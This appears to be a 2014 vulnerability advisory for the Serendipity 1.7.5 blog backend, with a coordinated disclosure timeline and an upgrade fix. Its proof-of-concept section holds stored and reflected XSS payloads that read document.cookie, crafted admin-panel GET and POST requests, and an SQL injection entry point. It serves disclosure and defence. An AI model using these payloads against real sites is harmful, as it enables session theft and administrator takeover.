@@ -1,0 +1,74 @@
+Advisory:		Serendipity 1.7.5 (Backend) - Multiple security vulnerabilities
+Advisory ID:		SSCHADV2014-003
+Author:			Stefan Schurtz
+Affected Software:	Successfully tested on Serendipity 1.7.5
+Vendor URL:		http://www.s9y.org/
+Vendor Status:		fixed
+
+==========================
+Vulnerability Description
+==========================
+
+The Serendipity 1.7.5 backend is prone to multiple security vulnerabilities
+
+==========================
+PoC-Exploit
+==========================
+
+// Stored-XSS with "Real name"
+
+(1) Login as "Standard editor" user
+(2) Under "Personal Settings" set your "Real name" to "><script>alert(document.cookie)</script>
+
+The XSS will be executed for the Administrator if he manages the users (Backend -> Administration -> Manage users)
+
+// SQL-Injection - with "serendipity[install_plugin]"
+
+http://[target]/serendipity/serendipity_admin.php?serendipity[adminModule]=plugins&serendipity[pluginPath]=serendipity_event_spamblock&serendipity[install_plugin]=[SQLi]
+
+// Reflected XSS_1 - "serendipity[install_plugin]"
+
+http://[target]/s/serendipity/serendipity_admin.php?serendipity[adminModule]=plugins&serendipity[pluginPath]=&serendipity[install_plugin]=78524'%3b<script>alert(1)</script>%2f%2f912
+
+// Reflected XSS_2 - "serendipity[id]"
+
+POST http://[target]/serendipity/serendipity_admin.php?
+
+serendipity%5Baction%5D=admin&serendipity%5BadminModule%5D=entries&serendipity%5BadminAction%5D=save&serendipity%5Bid%5D="><script>alert(document.cookie)<%2fscript>&serendipity%5Btimestamp%5D=1391086127&serendipity%5Bpreview%5D=false&serendipity%5Btoken%5D=0fb9473e000f67c7d530e0698c8ff2dc&serendipity%5Btitle%5D=test1&serendipity%5Bisdraft%5D=false&serendipity%5Bchk_timestamp%5D=1391086127&serendipity%5Bnew_timestamp%5D=2014-01-30+13%3A48&serendipity%5Bcategories%5D%5B%5D=0&serendipity%5Bbody%5D=test1&serendipity%5Ballow_comments%5D=true&serendipity%5Bextended%5D=
+
+// Reflected XSS_3 - "serendipity[timestamp]"
+
+POST http://[target]/serendipity/serendipity_admin.php?
+
+serendipity%5Baction%5D=admin&serendipity%5BadminModule%5D=entries&serendipity%5BadminAction%5D=save&serendipity%5Bid%5D=&serendipity%5Btimestamp%5D="><script>alert(document.cookie)<%2fscript>&serendipity%5Bpreview%5D=false&serendipity%5Btoken%5D=d9e231ef9eaeb5e58336806484de7600&serendipity%5Btitle%5D=test&serendipity%5Bisdraft%5D=false&serendipity%5Bchk_timestamp%5D=1391084636&serendipity%5Bnew_timestamp%5D=2014-01-30+13%3A23&serendipity%5Bcategories%5D%5B%5D=0&serendipity%5Bbody%5D=test%3Cstrong%3E%3C%2Fstrong%3E%3Cblockquote%3E%3C%2Fblockquote%3E&serendipity%5Ballow_comments%5D=true&serendipity%5Bmoderate_comments%5D=true&serendipity%5Bextended%5D
+
+==========================
+Solution
+==========================
+
+Upgrade to the latest version Serendipity 1.7.7
+
+==========================
+Disclosure Timeline
+==========================
+
+30-Jan-2014 - developer informed by email
+30-Jan-2014 - feedback from developer
+31-Jan-2014 - first diff tested
+03-Feb-2014 - second diff tested
+04-Feb-2014 - third diff tested
+06-Feb-2014 - release of Serendipity 1.7.7
+
+==========================
+Credits
+==========================
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+==========================
+References
+==========================
+
+http://s9y.org/
+http://blog.s9y.org/archives/253-Serendipity-1.7.7-released.html
+http://www.darksecurity.de/advisories/2014/SSCHADV2014-003.txt
